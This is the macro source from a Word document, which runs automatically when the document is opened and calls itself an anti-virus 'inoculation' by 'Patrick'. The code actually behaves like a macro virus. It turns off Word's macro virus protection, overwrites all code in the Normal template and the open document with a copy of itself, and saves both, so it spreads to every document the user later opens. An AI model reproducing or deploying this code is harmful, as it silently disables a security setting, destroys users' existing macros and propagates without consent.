   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Open()
   '
   ' ********** Anti-Virus macro by Patrick **********
   '
   ' <- this is a marker!
   ' DO NOT delete or alter the above marker line since the original virus looks for it
   ' and will not infect the document if the above line exists

   Const Marker = "Patricks marker!"
   On Error Resume Next

   'Declare Variables
   Dim SaveDocument, SaveNormalTemplate, DocumentInnoculated, NormalTemplateInnoculated As Boolean
   Dim ad, nt As Object
   Dim OurCode, UserAddress, LogData, LogFile As String

   'Initialize Variables
   Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
   Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

   DocumentInnoculated = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
   NormalTemplateInnoculated = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)

   'Switch the VirusProtection OFF
   Options.VirusProtection = False

     'Innoculate the NormalTemplate
     If DocumentInnoculated = True Then
       OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
       nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
       nt.CodeModule.AddFromString OurCode
       NormalTemplate.Save
     End If

     'Innoculate the ActiveDocument
       OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
       ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
       ad.CodeModule.AddFromString OurCode
       ActiveDocument.Save

   End Sub
